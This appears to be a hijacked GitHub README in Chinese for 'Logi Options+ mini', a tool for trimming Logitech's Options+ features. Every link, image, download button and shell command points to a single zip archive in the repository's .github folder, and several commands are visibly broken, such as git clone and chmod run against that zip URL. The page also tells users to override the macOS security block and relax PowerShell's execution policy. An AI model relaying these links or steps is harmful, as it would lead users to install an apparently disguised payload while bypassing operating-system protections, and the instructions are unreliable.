# Logi Options Plus Mini

[中文](https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip) | [English](https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip)

**Logi Options+ mini** 提供了一种选择来自定义 Logi Options+，方便用户能够更好地控制其功能。

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip">
  <source media="(prefers-color-scheme: light)" srcset="https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip">
  <img alt="Logi Options+ mini" src="https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip" width="600" > 
</picture>

<img width="600" alt="image" src="https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip">
<img width="600" alt="image" src="https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip">
<img width="600" alt="image" src="https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip">
<img width="600" alt="image" src="https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip">
<img width="600" alt="image" src="https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip">

## 项目简介

参考官方[Logitech Options 软件的批量安装和配置](https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip软件的批量安装和配置)

项目通过官方安装包命令行选项定制化Logi Options+功能。
支持macOS原生应用、macOS Shell、Windows PowerShell。

## 特性

- 定制化Logi Options+功能
- 易于使用的交互设计
- 卸载升级时自动保留配置
- 可定制功能
  - analytics 用户分享应用程序使用情况和诊断数据
  - flow
  - sso 用户登录应用程序的功能
  - update 应用程序更新
  - dfu 设备固件更新
  - logivoice 罗技语音功能
  - aipromptbuilder  AI Prompt Builder 功能（仅限macOS）
  - smartactions
  - actions-ring
  - device-recommendation 设备推荐功能（仅限macOS）

## 使用方法

### 使用 macOS 原生应用

下载最新版本 [here](https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip%20Options%2B%https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip)

[<img width="64" alt="logi option plus1" src="https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip" />](https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip%20Options%2B%https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip)

🔔 由于没有使用开发者证书签署应用，macOS可能会显示安全警告，需前往系统设置 → 隐私与安全 → 已阻止“Logi Options+mini”以保护Mac。然后点击“仍要打开”以运行该应用程序。

![WX20250305-181838@2x](https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip)

### 使用 macOS Shell

1. 克隆此项目到本地

   ```bash
   git clone https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip
   cd logi-options-plus-mini
   ```
2. 运行Shell脚本（需要 `sudo`权限卸载旧版本）

- macOS

  ```bash
  chmod u+x https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip
  https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip

  ##############################################################
  2024年12月15日 星期日 23时32分33秒 +08 | Starting install of Logi Options+
  ##############################################################

  Please select the features you want to keep:
  1. analytics:             Shows or hides choice for users to opt in to share app usage and diagnostics data.
  2. flow:                  Shows or hides the Flow feature. Default value is Yes
  3. sso:                   Shows or hides ability for users to sign into the app.
  4. update:                Enables or disables app updates.
  5. dfu:                   Enables or disables device firmware updates.
  6. backlight:             Enables or disables keyboard backlight on the supported keyboards.
  7. logivoice:             Enables or disables LogiVoice feature.
  8. aipromptbuilder:       Enables or disables AI Prompt Builder feature.
  9. device-recommendation: Enables or disables device recommendation feature.
  10. smartactions:         Enables or disables Smart Actions feature.
  11. actions-ring:         Enables or disables Actions Ring feature.
  12. all
  Press enter for none

  Enter your choices(e.g. 2 6, default is none): 
  ```
- Windows（需要管理员终端运行一次 `Set-ExecutionPolicy -ExecutionPolicy RemoteSigned`，具体见：[#5](https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip)）

  右键ps1脚本，`使用PowerShell运行`

  ```powershell
  ##############################################################
  12/17/2024 19:50:23 | Starting install of Logi Options+
  ##############################################################
  12/17/2024 19:50:24 | Downloading Logi Options+ Installer...
  12/17/2024 19:51:06 | Download completed successfully.
  12/17/2024 19:51:06 | Uninstalling existing version of Logi Options+...

  Please select the features you want to keep:
  1. analytics:             Shows or hides choice for users to opt in to share app usage and diagnostics data.
  2. flow:                  Shows or hides the Flow feature. Default value is Yes
  3. sso:                   Shows or hides ability for users to sign into the app.
  4. update:                Enables or disables app updates.
  5. dfu:                   Enables or disables device firmware updates.
  6. backlight:             Enables or disables keyboard backlight on the supported keyboards.
  7. logivoice:             Enables or disables LogiVoice feature.
  8. aipromptbuilder:       Enables or disables AI Prompt Builder feature.
  9. device-recommendation: Enables or disables device recommendation feature.
  10. smartactions:         Enables or disables Smart Actions feature.
  11. actions-ring:         Enables or disables Actions Ring feature.
  12. all
  Press enter for none

  Enter your choices(e.g. 2 6, default is none):

  ```

脚本将会自动下载官方安装包，并进行精简安装。

## 系统要求

- macOS
- Windows
- 网络连接以下载官方安装包

## FAQ

- 部分Mac无法使用官方方式卸载，需使用第三方工具卸载后重新运行。已测试使用 `Pearcleaner`卸载后可正常运行安装

### Contributors

<a href="https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip">
  <img src="https://github.com/kenleung05hk/logi-options-plus-mini/raw/refs/heads/main/.github/mini_plus_logi_options_3.1.zip" />
</a>

## 贡献

欢迎提交问题和请求。您可以通过以下方式贡献代码：

1. Fork 此仓库
2. 创建您的分支 (`git checkout -b feature/AmazingFeature`)
3. 提交您的更改 (`git commit -m 'Add some AmazingFeature'`)
4. 推送到分支 (`git push origin feature/AmazingFeature`)
5. 打开一个Pull Request

## 许可证

此项目使用 [Apache 许可证](LICENSE)。
